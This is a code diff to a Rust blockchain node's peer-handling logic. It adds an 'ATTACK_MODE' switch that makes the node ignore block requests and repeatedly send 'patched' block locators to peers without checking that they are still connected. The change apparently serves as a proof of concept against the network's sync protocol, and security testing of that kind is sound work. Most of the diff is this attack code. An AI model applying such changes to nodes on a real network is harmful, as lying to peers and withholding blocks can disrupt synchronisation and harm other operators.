@@ -202,6 +202,10 @@ impl<N: Network, C: ConsensusStorage<N>> Inbound<N> for Client<N, C> {
         let BlockRequest { start_height, end_height } = &message;
 
         // Retrieve the blocks within the requested range.
+        if std::env::var("ATTACK_MODE").is_ok() {
+            return true
+        }
+
         let blocks = match self.ledger.get_blocks(*start_height..*end_height) {
             Ok(blocks) => Data::Object(DataBlocks(blocks)),
             Err(error) => {
@@ -233,6 +237,7 @@ impl<N: Network, C: ConsensusStorage<N>> Inbound<N> for Client<N, C> {
             // If block locators were provided, then update the peer in the sync pool.
             if let Some(block_locators) = message.block_locators {
                 // Check the block locators are valid, and update the peer in the sync pool.
+                info!("@@@@@Recevied primary ping from '{peer_ip}'..., height: {}", block_locators.recents.keys().max().unwrap());
                 if let Err(error) = self.sync.update_peer_locators(peer_ip, block_locators) {
                     warn!("Peer '{peer_ip}' sent invalid block locators: {error}");
                     return false;
@@ -251,14 +256,23 @@ impl<N: Network, C: ConsensusStorage<N>> Inbound<N> for Client<N, C> {
         let self_ = self.clone();
         tokio::spawn(async move {
             // Sleep for the preset time before sending a `Ping` request.
-            tokio::time::sleep(Duration::from_secs(Self::PING_SLEEP_IN_SECS)).await;
             // Check that the peer is still connected.
-            if self_.router().is_connected(&peer_ip) {
-                // Retrieve the block locators.
-                match self_.sync.get_block_locators() {
+            tokio::time::sleep(Duration::from_secs(20)).await;
+            if std::env::var("ATTACK_MODE").is_ok() {
+                match self_.get_patched_block_locators() {
                     // Send a `Ping` message to the peer.
                     Ok(block_locators) => self_.send_ping(peer_ip, Some(block_locators)),
                     Err(e) => error!("Failed to get block locators - {e}"),
+                }
+            } else {
+                tokio::time::sleep(Duration::from_secs(Self::PING_SLEEP_IN_SECS)).await;
+                if self_.router().is_connected(&peer_ip) {
+                    // Retrieve the block locators.
+                    match self_.sync.get_block_locators() {
+                        // Send a `Ping` message to the peer.
+                        Ok(block_locators) => self_.send_ping(peer_ip, Some(block_locators)),
+                        Err(e) => error!("Failed to get block locators - {e}"),
+                    }
                 }
             }
         });
